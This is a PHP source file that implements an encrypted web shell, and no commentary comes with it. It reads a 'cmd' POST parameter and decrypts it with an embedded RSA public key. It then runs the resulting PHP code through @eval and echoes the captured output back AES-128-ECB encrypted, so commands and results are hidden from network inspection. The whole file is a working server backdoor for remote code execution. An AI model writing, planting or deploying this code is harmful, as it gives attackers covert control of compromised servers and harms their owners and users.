<?php
class Rsa {
    private static $PUBLIC_KEY= '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAl0IgFrz+OHJn0xBLs+Z8
A8tRwSv7AxNJCa43/jRbcO7cjgP2jm0WH2yYuhVFX011AUYOE8ijzh/VJea4YPRP
5yukTNJC4t4cDvdGg4AL+6NvGipMGDWDaEy/tT7RTDBXyMp+JbVed4npo3AwW5Hw
ODbF7+f9OCdBlFYYLOafsYN0fk2AD32RmtgekkCJrvN+RBUSCioULPm0I5UYJ2x2
U2DH1Qt8Ng2+XacPvhezCXWIvcEf22tISvzQaBs+rtzoSNFNMQr31/C5W5iVNmcv
zhamXSxk20NemfHgbd33vkSvQeVCTEheV2Np54GjfctLWZNz9uKkNgDaUcov58jb
2wIDAQAB
-----END PUBLIC KEY-----';
    private $decryptBlockSize = 256;
    private static function getPublicKey()
    {
        $publicKey = self::$PUBLIC_KEY;
        return openssl_pkey_get_public($publicKey);
    }

    public  function publicDecrypt($encrypted)
    {
        if (!is_string($encrypted)) {
            return null;
        }

        $result = '';
        $data = str_split(base64_decode($encrypted), $this->decryptBlockSize);
        foreach ($data as $block) {
            openssl_public_decrypt($block, $decrypted, self::getPublicKey());
            $result .= $decrypted;
        }
        return $result ? $result : null;

    }
}

class AES{
    var $AES_KEY;

    function __construct($key){
        $this->AES_KEY = $key;
    }

    public  function encryptAES($data)
    {

        if (!is_string($data)) {
            return null;
        }
        $encrypt = openssl_encrypt($data, 'AES-128-ECB', $this->AES_KEY, 0);
        return $encrypt;
    }

}




if(isset($_POST['cmd'])){
    $rsa = new Rsa();
    $publicDecrypt = json_decode($rsa->publicDecrypt($_POST['cmd']), true);
    $cmd = $publicDecrypt['cmd'];
    $aesKey = $publicDecrypt['aes'];
    $aes = new AES($aesKey);
    ob_start();
    try {
        @eval($cmd);
    }catch(Exception $e){

        throw new Exception();
    }
    //  $fun = create_function('',$cmd);
    //  $a = $fun();
    $res = ob_get_clean();
    $encryptedRes = $aes->encryptAES($res);
    echo $encryptedRes;
}
